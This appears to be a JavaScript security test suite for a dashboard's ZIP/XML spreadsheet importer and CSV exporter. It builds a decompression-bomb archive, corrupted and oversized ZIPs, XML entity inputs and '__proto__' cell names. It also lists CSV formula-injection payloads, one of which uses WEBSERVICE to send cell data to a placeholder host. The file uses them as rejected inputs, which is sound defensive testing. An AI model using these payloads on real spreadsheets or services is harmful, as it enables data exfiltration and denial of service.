import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import vm from 'node:vm';
import { deflateRawSync } from 'node:zlib';

await import('../../public/js/package-codec.js');
await import('../../public/js/ascm-import.js');
const read = path => readFile(new URL('../../' + path, import.meta.url), 'utf8');
const importerSource = await read('public/blueprint/importer.js');
const blueprintHtml = await read('public/blueprint/index.html');
assert.ok(blueprintHtml.indexOf('../js/ascm-import.js') < blueprintHtml.indexOf('src="importer.js"'), 'The standalone Blueprint entry loads its bounded archive dependency first.');
const fixtureWindow = {};
const context = vm.createContext({ window: fixtureWindow, ASCMImporter: globalThis.ASCMImporter });
vm.runInContext(importerSource.replace('window.HX_IMPORT_FILE =', 'window.auditInternals = { zipEntries, readCells, xml }; window.HX_IMPORT_FILE ='), context);
const importer = fixtureWindow.auditInternals;
const encoder = new TextEncoder();
const archive = (data, name = 'xl/workbook.xml') => Buffer.from(globalThis.PortfolioPackage.createZip([{ name, data: encoder.encode(data) }]));
const arrayBuffer = bytes => bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength);

const good = archive('<workbook>inert synthetic source</workbook>');
const opened = await importer.zipEntries(arrayBuffer(good));
assert.equal(await opened.read('xl/workbook.xml'), '<workbook>inert synthetic source</workbook>');
assert.equal(await opened.read('xl/absent.xml'), null);

function deflatedArchive(text, declaredSize = Buffer.byteLength(text)) {
  const stored = archive(text), nameLength = stored.readUInt16LE(26), payload = 30 + nameLength;
  const centralOffset = stored.length - 22 - (46 + nameLength);
  const compressed = deflateRawSync(Buffer.from(text));
  const local = Buffer.from(stored.subarray(0, payload));
  local.writeUInt16LE(8, 8); local.writeUInt32LE(compressed.length, 18); local.writeUInt32LE(declaredSize, 22);
  const central = Buffer.from(stored.subarray(centralOffset, stored.length - 22));
  central.writeUInt16LE(8, 10); central.writeUInt32LE(compressed.length, 20); central.writeUInt32LE(declaredSize, 24);
  const end = Buffer.from(stored.subarray(stored.length - 22)); end.writeUInt32LE(payload + compressed.length, 16);
  return Buffer.concat([local, compressed, central, end]);
}
const compressed = deflatedArchive('<workbook>valid compressed source</workbook>');
assert.equal(await (await importer.zipEntries(arrayBuffer(compressed))).read('xl/workbook.xml'), '<workbook>valid compressed source</workbook>');
// This tiny archive declares one output byte but would inflate to two MiB.
// The real streaming reader must reject it while reading, before concatenation.
const expansion = await importer.zipEntries(arrayBuffer(deflatedArchive('A'.repeat(2 * 1024 * 1024), 1)));
await assert.rejects(expansion.read('xl/workbook.xml'), error => error.code === 'DECOMPRESSION_LIMIT');
const corrupt = Buffer.from(good); corrupt[30 + corrupt.readUInt16LE(26)] ^= 1;
await assert.rejects((await importer.zipEntries(arrayBuffer(corrupt))).read('xl/workbook.xml'), error => error.code === 'CRC_MISMATCH');
const oversized = Buffer.from(good); const central = oversized.length - 22 - 46 - oversized.readUInt16LE(26); oversized.writeUInt32LE(121 * 1024 * 1024, central + 24);
await assert.rejects(importer.zipEntries(arrayBuffer(oversized)), error => error.code === 'ENTRY_TOO_LARGE');
for (const bytes of [new Uint8Array(), good.subarray(0, 18)]) await assert.rejects(importer.zipEntries(arrayBuffer(bytes)));
for (const text of ['<!DOCTYPE workbook><workbook/>', '<!ENTITY secret "payload">', null]) assert.throws(() => importer.xml(text), /unsupported XML|missing part/);

const cell = (address, value = 'fixture') => ({
  getAttribute: name => name === 'r' ? address : name === 't' ? 'inlineStr' : null,
  children: [], getElementsByTagNameNS: (_ns, name) => name === 't' ? [{ textContent: value }] : [],
});
const cells = nodes => ({ getElementsByTagNameNS: (_ns, name) => name === 'c' ? nodes : [] });
assert.equal(importer.readCells(cells([cell('A1')]), []).A1.value, 'fixture');
assert.equal(importer.readCells(cells([cell('XFD1048576')]), []).XFD1048576.value, 'fixture', 'The final legal Excel cell stays supported.');
for (const address of ['A0', 'A1048577', 'A99999999999', 'XFE1', '__proto__', null]) assert.throws(() => importer.readCells(cells([cell(address)]), []), /invalid worksheet cell/);
assert.throws(() => importer.readCells(cells([cell('A1'), cell('A1')]), []), /duplicate worksheet cell/);
assert.throws(() => importer.readCells(cells(Array(500001).fill(cell('A1'))), []), /supported cell limit/);

const engineWindow = {};
const engineContext = vm.createContext({ window: engineWindow });
vm.runInContext(await read('public/blueprint/analytics.js'), engineContext);
const source = {
  source: { name: 'Synthetic sparse fixture' },
  sheets: [{ name: 'Cat_View', cells: Object.fromEntries([
    ['A1', 'GroupName'], ['B1', 'Category'], ['C1', '2026 Rev'], ['D1', '2026 GM$'], ['E1', '2026 units'],
    ['A1048576', 'Sparse fixture item'], ['B1048576', 'Headsets'], ['C1048576', 0], ['D1048576', -2], ['E1048576', null],
  ].map(([address, value]) => [address, { value }])) }],
};
engineContext.raw = source;
// A sparse final Excel row used to allocate a record for every intervening row.
// Running the real normalizer in a bounded context protects this regression.
const normalized = vm.runInContext('window.HX_ANALYTICS.normalizeWorkbook(raw)', engineContext, { timeout: 1000 });
assert.equal(normalized.products.length, 1); assert.equal(normalized.products[0].id, 'product-1048576');
assert.equal(normalized.products[0].revenueByYear[2026], 0); assert.equal(normalized.products[0].gmByYear[2026], -2); assert.equal(normalized.products[0].unitsByYear[2026], null);
source.sheets[0].cells.A99999999999 = { value: 'invalid row' };
assert.throws(() => vm.runInContext('window.HX_ANALYTICS.normalizeWorkbook(raw)', engineContext, { timeout: 1000 }), /invalid worksheet row/);
// Sparse rows also need a table-work bound: a broad header with a short cell
// in many rows must not expand into millions of synthetic field/source pairs.
const column = index => { let name = ''; while (index) { index--; name = String.fromCharCode(65 + index % 26) + name; index = Math.floor(index / 26); } return name; };
engineContext.raw = { source: { name: 'Synthetic broad sparse table' }, sheets: [{ name: 'Cat_View', cells: Object.fromEntries([
  ...Array.from({ length: 1000 }, (_, index) => [column(index + 1) + '1', { value: 'Header ' + index }]),
  ...Array.from({ length: 2001 }, (_, index) => ['A' + (index + 2), { value: 'Sparse item ' + index }]),
]) }] };
assert.throws(() => vm.runInContext('window.HX_ANALYTICS.normalizeWorkbook(raw)', engineContext, { timeout: 1000 }), /supported record limit/);

const retailSource = await read('public/js/sellout-dashboard.js');
const csvDefinition = retailSource.match(/^  const csvCell = [^\n]+/m)?.[0];
assert.ok(csvDefinition);
const csvCell = vm.runInNewContext(csvDefinition + '\ncsvCell;');
for (const payload of ['=1+1', '+1+1', '@SUM(A1)', '-1+WEBSERVICE("https://example.invalid/"&A1)', '  =1+1', '\t=1+1', '\n=1+1', '\uFEFF-1+1']) {
  assert.ok(csvCell(payload).startsWith('"\''), 'Imported text must remain inert when opened in a spreadsheet: ' + JSON.stringify(payload));
}
assert.equal(csvCell(-12.5), '"-12.5"', 'Genuine negative numeric observations remain numeric.');
assert.equal(csvCell(0), '"0"'); assert.equal(csvCell(null), '""');
assert.equal(csvCell('Normal, "label"'), '"Normal, ""label"""');
console.log('Analytics security checks passed: bounded/CRC-verified ZIP ingestion, inert XML, validated cells, sparse row normalization, and safe spreadsheet exports.');
